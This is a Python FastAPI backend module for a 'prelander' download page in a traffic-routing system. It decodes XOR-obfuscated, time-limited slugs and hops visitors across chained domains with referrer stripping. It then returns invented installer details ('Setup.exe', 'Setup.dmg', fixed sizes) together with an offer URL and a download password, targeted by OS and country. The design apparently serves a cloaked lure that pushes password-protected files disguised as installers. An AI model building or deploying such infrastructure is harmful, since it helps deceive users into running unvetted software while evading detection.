"""
Prelander API — returns file details, offer URL, and password.

Endpoint: GET /prelander/resolve/{slug}
  - Decodes the XOR-encrypted slug from traffic_router.py
  - If the request host is an Inter domain → 302 to the Prelander domain /d/{slug}
    (completing the three-step flow: Anchor → Inter → Prelander)
  - Otherwise → returns prelander data (offer_url, password, os, etc.)

Three-step flow (bypass OFF, both Inter + Prelander configured):
  1. /click  →  inter_domain/d/{slug}              (entry point)
  2. inter/d/{slug} loads, calls /api/prelander/resolve/{slug}
     → backend detects Inter host → 302 to prelander_domain/d/{slug}
  3. prelander/d/{slug} loads, calls /api/prelander/resolve/{slug}
     → backend returns prelander data → page renders template

Two-step flow (bypass OFF, only Prelander OR only Inter configured):
  1. /click  →  prelander_domain/d/{slug}
  2. prelander/d/{slug} calls /api/prelander/resolve/{slug} → data returned

Bypass ON (direct_redirect_mode):
  1. /click  →  campaign URL directly (no prelander at all)
"""
import logging
from fastapi import APIRouter, Query, Depends, Request
from fastapi.responses import JSONResponse, RedirectResponse
from typing import Optional
from bson import ObjectId
import base64
from app.core.constants import DOMAIN_TYPE_INTER, DOMAIN_TYPE_PRELANDER
from app.core.glossary import domain_type_filter, normalize_domain_type
from app.dependencies import get_db

logger = logging.getLogger(__name__)

_XOR_KEY = "mxp2026"


def _decode_slug(slug: str) -> Optional[dict]:
    """
    Decode an XOR-encrypted slug → {os, timestamp, offer_id, campaign_id, country_code}.
    Returns None if invalid or if the timestamp is older than 1 hour (expired).
    """
    try:
        padded = slug + "=" * (4 - len(slug) % 4) if len(slug) % 4 else slug
        xored = base64.urlsafe_b64decode(padded)
        raw = "".join(chr(b ^ ord(_XOR_KEY[i % len(_XOR_KEY)])) for i, b in enumerate(xored))
        if ":" not in raw:
            return None
        parts = raw.split(":")
        result = {"os": parts[0]}

        # parts[1] is the timestamp — validate expiry (3600s = 1 hour)
        if len(parts) >= 2 and parts[1]:
            try:
                import time
                slug_ts = int(parts[1])
                age = time.time() - slug_ts
                if age > 3600:  # 1 hour expiry
                    logger.warning("[PRELANDER] Slug expired (age=%ds)", int(age))
                    return None
                if age < -60:   # Clock skew guard — reject future timestamps
                    logger.warning("[PRELANDER] Slug from the future, rejected")
                    return None
            except (ValueError, TypeError):
                return None

        if len(parts) >= 3 and parts[2]:
            result["offer_id"] = parts[2]
        if len(parts) >= 4 and parts[3]:
            result["campaign_id"] = parts[3]
        if len(parts) >= 5 and parts[4]:
            result["country_code"] = parts[4]
        return result
    except Exception:
        return None


router = APIRouter(prefix="/prelander", tags=["Prelander"])


@router.get("/domain-type")
async def get_domain_type(
    host: str,
    db=Depends(get_db),
):
    """
    Returns the configured domain_type for a hostname.
    Called by /d/[slug] page on load to decide whether to redirect.
    Response: { "domain_type": "anchor" | "inter" | "prelander" | "unknown",
                "prelander_domain": "https://prelander.com" | null }

    `last_domain` mirrors `prelander_domain` for browser sessions still running
    a pre-glossary bundle; drop it once those have cycled out.
    """
    from app.services.domain_service import normalize_domain, resolve_domain_url

    h = normalize_domain(host)
    if not h:
        return {"domain_type": "unknown", "prelander_domain": None, "last_domain": None}

    doc = await db.redirection_domains.find_one({"domain": h, "status": "active"})
    domain_type = normalize_domain_type(doc.get("domain_type"), default="unknown") if doc else "unknown"

    prelander_domain = None
    if domain_type != DOMAIN_TYPE_PRELANDER:
        publisher_ids = (doc or {}).get("publisher_ids") or []
        publisher_id = publisher_ids[0] if publisher_ids else None
        prelander_base = await resolve_domain_url(db, DOMAIN_TYPE_PRELANDER, publisher_id)
        if prelander_base and normalize_domain(prelander_base) != h:
            prelander_domain = prelander_base.rstrip("/")

    return {
        "domain_type": domain_type,
        "prelander_domain": prelander_domain,
        "last_domain": prelander_domain,
    }


@router.get("/resolve/{slug}")
async def resolve_slug(slug: str, request: Request, db=Depends(get_db)):
    """
    Main prelander resolver. Called by the /d/[slug] Next.js page.

    When the requesting host is an Inter domain:
      → 302 redirect to {prelander_domain}/d/{slug}  (completes the Inter hop)

    When the requesting host is a Prelander domain or any other host:
      → Returns prelander data JSON (offer_url, password, os, etc.)
    """
    from app.services.domain_service import normalize_domain, resolve_domain_url

    # Use X-Prelander-Host (sent by browser JS) OR Host header (sent by nginx).
    # X-Prelander-Host is the real browser domain even through the Next.js proxy.
    # Host header is set by nginx to $host so it's also reliable when nginx
    # routes /api/prelander directly to FastAPI (as in the catch-all block).
    xph = request.headers.get("x-prelander-host", "").strip()
    host_header = request.headers.get("host", "").strip()

    # Prefer X-Prelander-Host; fall back to Host; normalize both
    prelander_host = normalize_domain(xph or host_header)
    
    # Also check the raw host without port stripping (normalize_domain already strips port)
    if not prelander_host:
        prelander_host = normalize_domain(host_header)

    # ── Domain-type detection & hop ───────────────────────────────────────────
    # Always try to redirect to the Prelander domain unless the current host IS
    # already the Prelander domain. This handles four cases:
    #   1. Host is registered as Inter      → redirect to Prelander
    #   2. Host is registered as Anchor     → redirect to Prelander
    #   3. Host is NOT in DB at all         → redirect to Prelander (if one exists)
    #   4. Host IS the Prelander domain     → serve prelander data directly
    if prelander_host:
        # Is this host already the Prelander domain?
        prelander_doc = await db.redirection_domains.find_one({
            "domain": prelander_host,
            "domain_type": domain_type_filter(DOMAIN_TYPE_PRELANDER),
            "status": "active",
        })

        if not prelander_doc:
            # Not a Prelander domain — find the Prelander domain and hop to it
            inter_doc = await db.redirection_domains.find_one({
                "domain": prelander_host,
                "domain_type": domain_type_filter(DOMAIN_TYPE_INTER),
                "status": "active",
            })
            publisher_ids = (inter_doc or {}).get("publisher_ids") or []
            publisher_id = publisher_ids[0] if publisher_ids else None

            prelander_base = await resolve_domain_url(db, DOMAIN_TYPE_PRELANDER, publisher_id)
            if prelander_base and normalize_domain(prelander_base) != prelander_host:
                dest = f"{prelander_base.rstrip('/')}/d/{slug}"
                logger.info("[PRELANDER] Hopping %s → %s", prelander_host, dest)
                return RedirectResponse(
                    url=dest,
                    status_code=302,
                    headers={"Referrer-Policy": "no-referrer"},
                )
        # Either on the Prelander domain already, or none configured → serve data

    # ── Normal resolve ─────────────────────────────────────────────────────────
    decoded = _decode_slug(slug)
    if not decoded:
        return JSONResponse(status_code=404, content={"detail": "Not found"})

    return await _get_prelander_data(
        request, decoded["os"], db,
        offer_id=decoded.get("offer_id"),
        campaign_id=decoded.get("campaign_id"),
        country_code=decoded.get("country_code"),
    )


@router.get("/data")
async def get_prelander_data_legacy(
    request: Request,
    os: str = Query("windows", description="OS type: windows or mac"),
    pub: Optional[str] = Query(None, description="Publisher ID"),
    db=Depends(get_db),
):
    """Legacy endpoint — returns prelander data without a slug."""
    return await _get_prelander_data(request, os, db)


async def _get_prelander_data(
    request: Request,
    os: str,
    db,
    offer_id: Optional[str] = None,
    campaign_id: Optional[str] = None,
    country_code: Optional[str] = None,
):
    """Core prelander data resolution logic."""
    os_lower = os.lower()

    # Prelander template override — if the host IS a Prelander domain, use its
    # template setting to pin the page to a specific OS.
    host = request.headers.get("host", "").split(":")[0].lower()
    if host:
        from app.services.domain_service import normalize_domain
        prelander_domain_doc = await db.redirection_domains.find_one({
            "domain_type": domain_type_filter(DOMAIN_TYPE_PRELANDER),
            "domain": normalize_domain(host),
            "status": "active",
        })
        if prelander_domain_doc:
            tpl = prelander_domain_doc.get("template", "default")
            if tpl == "mac":
                os_lower = "mac"
            elif tpl == "windows":
                os_lower = "windows"

    # Per-OS file metadata
    if os_lower == "mac":
        file_name, file_ext, file_size = "Setup", ".dmg", "4.2 MB"
        file_version, file_description = "1.0.0", "macOS Application Installer"
    else:
        file_name, file_ext, file_size = "Setup", ".exe", "3.8 MB"
        file_version, file_description = "1.0.0", "Windows Application Installer"

    offer_url = None
    password = None
    campaign_name = None

    # 1. Specific offer from slug — highest priority because TargetingEngine
    # resolved this specific offer as the winning destination.
    if offer_id:
        try:
            offer = await db.offers.find_one({"_id": ObjectId(offer_id), "status": "active"})
            if not offer:
                offer = await db.offers.find_one({"_id": offer_id, "status": "active"})
            if offer:
                offer_url = offer.get("offer_url")
                password = offer.get("password") or None
                if offer.get("campaign_id"):
                    try:
                        camp = await db.campaigns.find_one({"_id": ObjectId(offer["campaign_id"])})
                        if camp:
                            campaign_name = camp.get("name")
                            if password is None and "password" not in offer:
                                password = camp.get("password")
                    except Exception:
                        pass
        except Exception:
            pass

    # 2. GEO rule — country-specific URL if no specific offer was matched
    if not offer_url and campaign_id and country_code:
        geo_rule = await db.geo_rules.find_one(
            {"campaign_id": campaign_id, "country_code": country_code.upper()},
            sort=[("priority", -1)],
        )
        if geo_rule and geo_rule.get("offer_url"):
            offer_url = geo_rule["offer_url"]
            password = geo_rule.get("password") or None

    # 3. Campaign from slug
    if not campaign_name and campaign_id:
        try:
            camp = await db.campaigns.find_one({"_id": ObjectId(campaign_id)})
            if camp:
                campaign_name = camp.get("name")
                if password is None:
                    password = camp.get("password")
        except Exception:
            pass

    # 4. Fallback — match by domain, OS, or any active campaign
    if not offer_url:
        campaign = None
        req_host = request.headers.get("host", "").split(":")[0].lower()

        if req_host:
            lp = await db.landing_pages.find_one({
                "status": "active",
                "lander_url": {"$regex": req_host, "$options": "i"},
            })
            if lp and lp.get("campaign_id"):
                try:
                    campaign = await db.campaigns.find_one({"_id": ObjectId(lp["campaign_id"])})
                except Exception:
                    pass

        if not campaign:
            device_os = "windows" if os_lower == "windows" else "mac"
            campaign = await db.campaigns.find_one({
                "status": "active",
                "device_os": {"$regex": f"^{device_os}$", "$options": "i"},
            })

        if not campaign:
            campaign = await db.campaigns.find_one({
                "status": "active",
                "device_os": {"$regex": "^global$", "$options": "i"},
            })

        if not campaign:
            campaign = await db.campaigns.find_one({"status": "active"})

        if campaign:
            campaign_name = campaign.get("name")
            offer_url = (
                campaign.get("default_offer_url")
                or campaign.get("offer_url")
                or campaign.get("url")
            )
            if not password:
                password = campaign.get("password")

    if not offer_url:
        offer_url = "https://example.com"

    return {
        "success": True,
        "file_name": file_name,
        "file_ext": file_ext,
        "file_size": file_size,
        "file_version": file_version,
        "file_description": file_description,
        "offer_url": offer_url,
        "password": password,
        "campaign_name": campaign_name,
        "os": os_lower,
    }
